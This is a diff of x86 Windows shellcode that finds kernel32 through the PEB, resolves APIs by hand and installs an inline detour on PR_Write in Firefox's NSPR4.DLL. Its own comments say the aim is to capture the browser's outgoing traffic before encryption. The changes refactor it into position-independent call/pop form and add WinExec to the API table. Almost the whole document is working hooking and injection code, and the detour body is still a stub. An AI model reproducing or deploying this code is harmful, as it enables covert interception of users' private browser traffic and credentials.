@@ -62,7 +62,7 @@ entry_point:
     xor         ecx,ecx
     xor         esi,esi
     xor         edi,edi
-                                ; we've cleared the general purpose registers
+				; we've cleared the general purpose registers
     jmp         get_kernel32
     
 get_kernel32:
@@ -74,22 +74,20 @@ get_kernel32:
     mov         edx,[edx + 0x10]; get the 3rd entries base address (kernel32.dll)
     
 get_export_directory_table:
-    mov         ebx,[edx + 0x3c] ; ebx = offset of PE signature in kernel32.dll
+    mov         ebx,[edx + 0x3c]; ebx = offset of PE signature in kernel32.dll
     mov         ebx,[edx + ebx + 0x78]
-                                ; ebx = offset of Export Directory Table in kernel32.dll
+				; ebx = offset of Export Directory Table in kernel32.dll
     add         ebx,edx         ; ebx = adress of Export Directory Table
     
 get_GetProcAddress_address:
     mov         ecx,[ebx+0x18]  ; ecx = nb of exported APIs (counter)
     mov         eax,[ebx+0x20]  ; eax = offset of Export Name Pointer Table in kernel2.dll
     add         eax,edx         ; eax = address of Export Name Pointer Table
-    
-get_GetProcAddress_address_loop:
+	
+find_GetProcAddress:
+    call        get_address_of_GetProcAddress
+    pop         edi             ; edi = address of 'GetProcAddress' string
     dec         ecx             ; we'll index the APIs in reverse order; start from highest index
-    jmp         get_GetProcAddress_string 
-    
-get_GetProcAddress_string_return:
-    pop         edi             ; edi = 'GetProcAddress'
     mov         esi,[eax+ecx*4] ; esi = ordinal of 'APIName\n' in Name Pointer Table
     add         esi,edx         ; esi = adress of 'APIName\n' in Name Pointer Table
     push        ecx             ; store
@@ -97,84 +95,59 @@ get_GetProcAddress_string_return:
     add         cl,14           ; ecx = length of "GetProcAddress" string
     repe        cmpsb           ; compare the strings pointed to by edi and esi
     pop         ecx             ; restore: ecx = nb exported APIs
-    jnz         get_GetProcAddress_address_loop
+    jnz         find_GetProcAddress
     mov         eax, [ebx+0x24] ; eax = offset Ordinal Table in kernel32.dll
     add         eax,edx         ; eax = adresse Ordinal Table
     mov         cx, [eax+ecx*2] ; cx = API ordinal - first ordinal
     mov         ax,[ebx+0x10]   ; eax = first ordinal in the table table
-    add         cx,ax ;         cx = ordinal de la API
+    add         cx,ax           ; cx = ordinal de la API
     dec         cx              ; to fall just in-phase (ordinal starts at 0)
     mov         eax,[ebx+0x1c]  ; eax = offset Export Address Table
     add         eax,edx         ; eax = adress of Export Address Table
     mov         eax,[eax+ecx*4] ; eax = offset of GetProcAddress kernel32.dll
-    add         eax,edx 
-    mov         ebx,eax         ; ebx = adresse GetProcAddress
-    jmp         get_stuff_to_load_from_kerne32
+    add         eax,edx 	; eax = adress of GetProcAddress API
+    call        get_address_of_GetProcAddress
+    pop         edi             ; edi = address of 'GetProcAddress' string
+    stosd			; save back to source address!
     
-get_stuff_to_load_from_kerne32_return:
-    pop 	esi		; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
-    mov 	edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll progressively 
-				; override the said table with addresses of the the loaded APIs. BTW, we won't be 
-				; needing the table in future!
-    call	load_apis	; when this returns, edi points to table of API addresses
-                                ; XXX Do error-checks here!
-    jmp        get_address_of_nspr4dll_path
+real_business_begins:
+    call        get_address_of_useful_kernel32dll_APIs
+    
+load_useful_kernel32dll_APIs:
+    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
+    call	load_APIs	
+				; XXX Do error-checks here!
+    jmp         get_address_of_nspr4dll_path
 
 grab_nspr4dll_handle:
-    ;int3
-    ;int3
     pop		ecx 		; address of NSPR4.DLL path
     push 	ecx
-    call 	[edi - 0xC]	; GetModuleHandleA(dll path address)
-    ;int3
-    ;int3
-    jmp     after_grab_nspr4dll_handle
+    call	get_address_of_useful_kernel32dll_APIs
+    pop		edi
+    call 	[edi+0x4*3]; GetModuleHandleA(dll path address)
     
 after_grab_nspr4dll_handle:
     test        eax,eax
     jz          error           ; NSPR4.DLL not yet loaded or process is not FIREFOX !
     mov         edx,eax
-    ;int3
-    jmp         get_stuff_to_hook_from_nspr4dll
-    
-get_stuff_to_hook_from_nspr4dll_return:
-    jmp load_stuff_to_hook_from_nspr4
+    call        get_address_of_target_nspr4dll_APIs
 
-load_stuff_to_hook_from_nspr4: 
-    pop 	esi		; esi now points to the NULL-seperated list/table of APIs we'll be loading from NSPR4.DLL
-    ;int3
-    push        edi             ; save: remeber, j ==> [eax - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the APIs
-                                ; loaded from kernel32.dll
-    mov 	edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll progressively 
-				; override the said table with addresses of the the loaded APIs. BTW, we won't be 
-				; needing the table in future!
-    call	load_apis	; when this returns, edi points to table of API addresses
-                                ; XXX Do error-checks here!
-    mov         eax,edi         ; j ==> [eax - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the APIs we just
-                                ; loaded from NSPR4.DLL. In the sequel, we'll try not to misplace this 'piece of info'.
-    
-    pop         edi             ; restore
-    ;int3
-    jmp         hook_stuff_from_nspr4
+load_target_nspr4dll_APIs: 
+    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from NSPR4.DLL
+    call	load_APIs
+				; XXX Do error-checks here!
     
 hook_stuff_from_nspr4:
-    fldz
-    fnstenv     [esp-0xC]
-    pop edx
-    add         dl,0xA
-    nop                         ; edx now contains (run-time) address of this point
-    add         edx,($PR_Write_detour - $hook_stuff_from_nspr4 - 0xA)
-                                ; edx now contains (run-time) address of PR_Write_detour
-                                ; and edx - 5 contains (run-time) address of PR_Write_detour_trampoline
-    ;int3
-    push        edi             ; save
-    push        eax             ; save
-    
+    call        get_address_of_PR_Write_detour_trampoline
+    pop         edx		; edx now contains (run-time) address of PR_Write_detour_trampoline	
+	
 set_offset_for_PR_Write_detour_trampoline:
     mov         edi, edx
-    sub         edi,0x4
-                                ; edi now contains address of "\xDE\xAD\xBE\xEF" string in PR_Write_detour_trampoline
-    mov         ecx,[eax-4]     ; eax now contains address of PR_Write API
+    add         edi,0x1		; edi  = address of "\xDE\xAD\xBE\xEF" string in PR_Write_detour_trampoline
+    call	get_address_of_target_nspr4dll_APIs
+    pop		eax
+				
+    mov         ecx,[eax]     	; ecx now contains address of PR_Write API
     add         ecx,0x6         ; <- 6 bytes ahead; untampered bytes of the API start here
     xor         eax,eax
     sub         ecx,edi
@@ -182,97 +155,79 @@ set_offset_for_PR_Write_detour_trampoline:
     sub         ecx,0x5         ; 5-byte correction (size of jump instruction in PR_Write_detour_trampoline)
     mov         eax,ecx   
     stosd
-    ;int3
-    ;int3
 
 after_set_offset_for_PR_Write_detour_trampoline:
-    pop         eax             ; restore
-    pop         edi             ; restore
-    ;int3
-    ;int3
-    push        esi             ; save
-    push        eax             ; save
-    push        edx             ; save
-    push        edi             ; save
-    mov         eax,[eax-0x4]   ; eax now contains address of PR_Write
-    ;int3
+    call	get_address_of_target_nspr4dll_APIs
+    pop		eax
+    mov         eax,[eax]       ; eax now contains address of PR_Write API
     
 tweak_PR_Write_memory_access_rights:
     push        esi             ; would-be pointer to current access right (useful if we wish to restore it later)
     push        0x40            ; PAGE_EXECUTE_READWRITE
     push        0x6             ; size
     push        eax             ; address of PR_Write
-    call        [edi - 0x14]    ; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
+    call	get_address_of_useful_kernel32dll_APIs
+    pop		edi
+    call        [edi+0x4]    	; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
     
 after_tweak_PR_Write_memory_access_rights:
-                                ; error-checks follow
+				; error-checks follow
     test        eax,eax
-    pop         edi             ; restore
-    pop         edx             ; restore
-    pop         eax             ; restore
-    pop         esi             ; restore
     jz          error           ; Oops! It's no good to continue!
-    
+   
 install_PR_Write_detour:
-    push        eax
-    push        edi
-    mov         edi,[eax - 4]   ; address of PR_Write
+    call        get_address_of_PR_Write_detour
+    pop         edx				; edx now contains (run-time) address of PR_Write_detour
+    call	get_address_of_target_nspr4dll_APIs
+    pop		eax
+    mov         edi,[eax]   	; edi = address of PR_Write API
     xor         eax,eax         ; clear, we are parano
     mov         al, 0x90
     stosb                       ; write NOP to address of PR_Write
-    ;int3
     mov         al, 0xE9
     stosb                       ; write \xE9 to address of PR_Write, + 1
-    ;int3
     xor         eax,eax
     mov         eax,edx
-    ;int3
-    ;int3
     sub         eax,edi
     add         eax,0x1         ; <- weird correction!
     sub         eax,0x5         ; correction for jmp instruction itself
-                                ; now eax = address of PR_Write_detour - (address of PR_Write + 1) - 5
+				; now eax = address of PR_Write_detour - (address of PR_Write + 1) - 5
     stosd                       ; write eax to address of PR_Write + 2
-                                ; the patch is now 90 E9 DEADBEEF
-                                
-after_install_PR_Write_detour:
-    ;int3
-    pop         edi             ; restore
-    pop         eax             ; restore
-    ;int3
-                                
+				; the patch is now 90 E9 DEADBEEF
+						     
 restore_PR_Write_memory_access_rights:
-    push        esi             ; save
-    push        eax             ; save
-    push        edx             ; save
-    push        edi             ; save
-    mov         eax,[eax-0x4]   ; eax now contains address of PR_Write
+    call	get_address_of_target_nspr4dll_APIs
+    pop		eax
+    mov         eax,[eax]   	; eax now contains address of PR_Write
     mov         edx,[esi]       ; edx now contains previous PR_Write memory access rights
     push        esi             
     push        edx
     push        0x6             ; size
     push        eax             ; address of PR_Write
-    call        [edi - 0x14]    ; VirtualProtect(address of PR_Write, 0x6, previous protection, esi)
-    pop         edi             ; restore
-    pop         edx             ; restore
-    pop         eax             ; restore
-    pop         esi             ; restore
-    push        eax             ; save
-    push        edi             ; save  
+    call	get_address_of_useful_kernel32dll_APIs
+    pop		edi
+    call        [edi+0x4]    	; VirtualProtect(address of PR_Write, 0x6, PAGE_EXECUTE_READWRITE, esi)
     jmp quit
 
+get_address_of_PR_Write_detour_trampoline:
+    pop         eax
+    call        eax
+	
 PR_Write_detour_trampoline:
     db 0xE9
-                                ; The following double-word will be corrected according by
-                                ; set_offset_for_PR_Write_detour_trampoline
+				; The following double-word will be corrected according by
+				; set_offset_for_PR_Write_detour_trampoline
     db 0xDE
     db 0xAD
     db 0xBE
     db 0xEF
+ 
+get_address_of_PR_Write_detour:
+    pop         eax
+    call        eax
     
 PR_Write_detour:
     nop                         ; This is just a stub. We own outgoing pre-encryption firefox traffic!
-                                ; XXX TODO: As P-O-C, log traffic to file
     
 PR_Write_patched_bytes:
     MOV         EAX,[ESP+4]
@@ -281,65 +236,72 @@ PR_Write_patched_bytes:
 resume_PR_Write:
     jmp         PR_Write_detour_trampoline 
     
-load_apis:
-    nop				; @description: loads a bunch of APIs from a DLL
-				; Here, I expect:
-				; 1]-- edx set to the address of the DLL from which we'll load the APIs
-				; 2]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
-				; 3]-- ebx set to the address of GetProcAddress
+load_APIs:
+				; @description: loads a bunch of APIs from a DLL
+                                ; Here, I expect:
+                                ; 0]-- edx set to the address of the DLL from which we'll load the APIs
+                                ; 1]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
+    push	esi	        ; save
+    call        get_address_of_GetProcAddress
+    pop         edi 
+    pop		esi		; restore
+    mov		ebx,[edi]	; ebx  = address of GetProcAddress API   
+    mov         edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll 
+				; progressively override the said table of API names (pointed-to by esi) with 
+				; addresses of the the loaded APIs. BTW, we won't be needing these names in future!
     
-load_next_api:
+load_next_API:
+				; loop until zero-byte (new table entry marker) found
     lodsb
     test	al,al
-    jnz         load_next_api
+    jnz         load_next_API
 
 check_end_of_API_table:
     lodsb
     dec		esi 		; fix-up
     test	al,al
-    jz 		load_apis_end	
+    jz 		load_APIs_end	
 
-continue_load_nex_api:
+continue_load_next_API:
     push	ebx  		; save
     push 	edx		; save
     push	esi  
     push	edx  		; DLL address
-    ;int3
-    call	ebx  		; GetProcAddress(DLL address, API_Name);
-    ;int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
-    pop edx			; restore 
-    pop	ebx			; restore   
+    ; int3
+    call	ebx  		; GetProcAddress(DLL address, API_Name)
+    ; int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
+    pop         edx		; restore 
+    pop	        ebx		; restore   
     stosd			; write the output to EDI
     add         esi,0x3         ; substract strlen of shortest API name - 1
-    jmp		load_next_api	;
+    jmp		load_next_API	
 
-load_apis_end:
-    ;int3
+load_APIs_end:
     ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
     
 error:
-    call        [edi - 0x18]    ; GetLastError()
-    ;int3
-    ;int3
-    nop				; this is just a stub
-
+				; this is just a stub
+    call        get_address_of_useful_kernel32dll_APIs
+    pop         edi
+    call        [edi]           ; GetLastError()
+    jmp		quit
+   
 quit:
+    call        get_address_of_useful_kernel32dll_APIs
+    pop         edi
     push 	0x0
-    call	[edi - 4]	; ExitThread(0x0)	
+    call	[edi+0x4*5]	; ExitThread(0x0)	
     
-get_GetProcAddress_string:
-    call        get_GetProcAddress_string_return
-				; the above call will push the address of the NULL-terminated "GetProcAddress" string, 
-				; and then jump to the get_stuff_to_load_from_kerne32_return label
+get_address_of_GetProcAddress:
+    pop		esi
+    call        esi
     db 'GetProcAddress'
     db 0x0
     
-get_stuff_to_load_from_kerne32:
-    call        get_stuff_to_load_from_kerne32_return
-            			; The above call will push the address of the following table, and then jump to the
-				; get_stuff_to_load_from_kerne32_return label.
-    db 0x0 			; <- marks beginning of next table entry
-                                ; <- add other API (NULL-seperated!) names here if you wll
+get_address_of_useful_kernel32dll_APIs:
+    pop         esi             
+    call        esi     
+    db 0x0 			; <- marks beginning of next table entr
     db "GetLastError"
     db 0x0
     db "VirtualProtect"
@@ -352,19 +314,26 @@ get_stuff_to_load_from_kerne32:
     db 0x0
     db "ExitThread"
     db 0x0
-    db 0x0 ; <- marks end of this table 
+    db "WinExec"
+    db 0x0
+				; <- add other API (NULL-seperated!) names here if you will
+    db 0x0                      ; <- marks end of this table 
     
 get_address_of_nspr4dll_path:
     call        grab_nspr4dll_handle
     db "NSPR4.DLL"
     db 0x0
     
-get_stuff_to_hook_from_nspr4dll:
-    call        get_stuff_to_hook_from_nspr4dll_return
-    db 0x0                      ; marks start of table entry
+get_address_of_target_nspr4dll_APIs:
+    pop         esi             ; esi = return address
+    call        esi       
+				; The above call will push the address of the following table, and then jump to the
+				; instruction just after the caller -- the return address.
+    db 0x0 		        ; <- marks beginning of next table entry
+				; <- add other API (NULL-seperated!) names here if you will
     db "PR_Write"
     db 0x0
-    db 0x0                      ; marks end of table
+    db 0x0                      ; <- marks end of table
     
 zthe_end:
 
